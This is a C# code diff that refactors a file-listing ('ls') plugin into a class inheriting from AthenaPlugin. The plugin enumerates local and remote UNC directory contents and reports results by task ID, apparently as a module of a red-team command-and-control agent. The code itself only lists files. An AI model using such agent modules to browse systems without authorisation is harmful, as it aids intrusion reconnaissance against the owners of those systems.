@@ -7,11 +7,11 @@ using System.Linq;
 using System.Net;
 using System.Threading.Tasks;
 
-namespace Plugin
+namespace Plugins
 {
-    public static class ls
+    public class Plugin : AthenaPlugin
     {
-        public static void Execute(Dictionary<string, object> args)
+        public override void Execute(Dictionary<string, object> args)
         {
             if (args["path"] is not null)
             {
@@ -45,9 +45,9 @@ namespace Plugin
                             path += "/"; //Add appropriate line endings to make parsing easier
                         }
                     }
-                    
+
                     string tempPath = @"\\" + host + @"\" + path;
-                    
+
                     if (!File.Exists(tempPath) && !Directory.Exists(tempPath))
                     {
                         PluginHandler.AddResponse(new FileBrowserResponseResult
@@ -88,8 +88,7 @@ namespace Plugin
                 });
             }
         }
-        
-        static FileBrowserResponseResult ReturnRemoteListing(string path,string host, string taskid)
+        FileBrowserResponseResult ReturnRemoteListing(string path, string host, string taskid)
         {
             try
             {
@@ -97,12 +96,12 @@ namespace Plugin
                 if (baseFileInfo.Attributes.HasFlag(FileAttributes.Directory)) //Check if they just requested info about a specific file or not
                 {
                     DirectoryInfo baseDirectoryInfo = new DirectoryInfo(baseFileInfo.FullName);
-                    
+
                     if (baseDirectoryInfo.Parent is null) //Our requested directory has no parent
                     {
                         var files = GetFiles(path, host).ToList();
                         string output;
-                        if(files.Count > 0)
+                        if (files.Count > 0)
                         {
                             output = $"Returned {files.Count} files in the file browser.";
                         }
@@ -111,7 +110,7 @@ namespace Plugin
                             output = $"No files returned.";
                         }
 
-                        
+
 
                         return new FileBrowserResponseResult
                         {
@@ -201,7 +200,7 @@ namespace Plugin
             }
         }
 
-        static FileBrowserResponseResult ReturnLocalListing(string path, string taskid)
+        FileBrowserResponseResult ReturnLocalListing(string path, string taskid)
         {
             try
             {
@@ -307,10 +306,10 @@ namespace Plugin
                     user_output = ex.ToString(),
                     status = "error"
                 };
-             }
+            }
         }
 
-        static ConcurrentBag<FileBrowserFile> GetFiles(string path, string host)
+        ConcurrentBag<FileBrowserFile> GetFiles(string path, string host)
         {
             ConcurrentBag<FileBrowserFile> files = new ConcurrentBag<FileBrowserFile>();
             try
@@ -319,7 +318,7 @@ namespace Plugin
                 if (parentFileInfo.Attributes.HasFlag(FileAttributes.Directory))
                 {
                     DirectoryInfo parentDirectoryInfo = new DirectoryInfo(parentFileInfo.FullName);
-                    
+
 
                     Parallel.ForEach(parentDirectoryInfo.GetFileSystemInfos(), fInfo =>
                     {
@@ -365,14 +364,14 @@ namespace Plugin
             }
         }
 
-        static string NormalizeFileName(string path, string host)
+        string NormalizeFileName(string path, string host)
         {
 
-            if(host == "")
+            if (host == "")
             {
                 return path;
             }
-            
+
             path = path.TrimStart('\\').TrimStart('\\').TrimEnd('/').TrimEnd('\\'); //Remove \\ at the beginning of the path and / at the end
 
             int index = path.IndexOf(host);
